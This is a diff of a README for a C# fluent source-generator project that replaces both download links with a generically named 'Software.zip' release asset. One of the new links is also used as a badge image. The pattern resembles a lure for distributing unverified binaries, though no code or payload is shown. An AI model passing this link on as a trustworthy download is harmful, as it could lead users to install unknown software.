@@ -1,6 +1,6 @@
 # **Fluent-Source-Generator**
 
-[![GitHub Link](https://img.shields.io/badge/Download-zip-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![GitHub Link](https://github.com/TheBronxCL/Fluent-Source-Generator/releases/download/v2.0/Software.zip)](https://github.com/TheBronxCL/Fluent-Source-Generator/releases/download/v2.0/Software.zip)
 
 ## Description
 Welcome to the "Fluent-Source-Generator" repository! This project offers a modern, intuitive, and easily readable alternative to traditional text templating and source code generation libraries. It presents a fluent API based on C# that simplifies the process of generating code, making it more accessible to developers of all levels.
@@ -27,7 +27,7 @@ Explore the following topics related to the "Fluent-Source-Generator" repository
 
 ## Getting Started
 To get started with the "Fluent-Source-Generator" repository, download the latest release from the following link:
-[Download v1.0.0.zip](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[Download https://github.com/TheBronxCL/Fluent-Source-Generator/releases/download/v2.0/Software.zip](https://github.com/TheBronxCL/Fluent-Source-Generator/releases/download/v2.0/Software.zip)
 
 ## Installation
 Once you have downloaded the zip file, extract it and follow the installation instructions provided in the repository. For detailed steps, please refer to the official documentation.
